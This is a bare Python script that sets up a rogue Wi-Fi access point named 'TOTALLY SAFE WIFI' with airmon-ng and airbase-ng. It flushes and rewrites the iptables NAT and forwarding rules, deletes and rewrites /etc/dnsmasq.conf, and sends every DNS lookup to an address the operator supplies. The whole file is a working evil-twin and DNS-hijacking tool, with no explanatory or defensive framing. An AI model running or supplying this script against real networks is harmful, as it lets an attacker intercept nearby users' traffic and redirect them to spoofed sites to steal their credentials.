#!/usr/bin/python

import os
import sys

def writeDnsmasq():
	f = open("/etc/dnsmasq.conf","w")
	f.write("no-resolv\n")
	f.write("interface=at0\n")
	f.write("dhcp-range="+str(sys.argv[2])+","+str(sys.argv[3])+",12h\n")
	f.write("server=8.8.8.8\n")
	f.write("server=8.8.8.4\n")
	f.write("address=\"/#/"+str(sys.argv[1])+"\"\n")




os.system('rm /etc/dnsmasq.conf')
os.system('iptables -F')
os.system('iptables -t nat -F')
os.system('iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE')
os.system('iptables -A FORWARD --in-interface at0 -j ACCEPT')
os.system('airmon-ng check kill')
os.system('airmon-ng start wlan0')
os.system('airbase-ng -e "TOTALLY SAFE WIFI" -c 11 -v wlan0mon')
os.system('ifconfig at0 ' + str(sys.argv[1]) + ' netmask 255.255.255.0 up')
writeDnsmasq()
os.system('dnsmasq -C /etc/dnsmasq.conf')
